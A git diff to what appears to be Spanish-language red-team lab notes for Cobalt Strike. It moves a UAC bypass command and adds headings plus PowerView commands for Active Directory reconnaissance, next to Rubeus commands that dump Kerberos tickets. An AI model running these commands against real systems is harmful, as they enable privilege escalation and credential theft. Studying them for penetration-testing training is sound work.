@@ -159,8 +159,13 @@ Copiar el binario
 ```
 copy "tcp-local_x64.svc.exe" "Service 3.exe"
 ```
-
+## UAC Bypasses
+```
+elevate uac-schtasks tcp-local
+```
 # Credential Theft
+
+## Kerberos Tickets
 Extraer Tickets de Kerberos
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
@@ -170,7 +175,27 @@ Coger el TGT
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x... /service:
 ```
 
-## UAC Bypasses
+# Domain Reconnaissance
+
+## PowerView
+
+Ver el dominio
 ```
-elevate uac-schtasks tcp-local
+powershell Get-Domain
+```
+Ver el dominio, el DC y su OS
+```
+powershell Get-Domain
+```
+Ver todos los dominios del bosque
+```
+powershell Get-ForestDomain
+```
+Ver la política de contraseñas del dominio
+```
+Get-DomainPolicyData
+```
+Ver los grupos a los que pertenece un usuario
+```
+powershell Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl
 ```
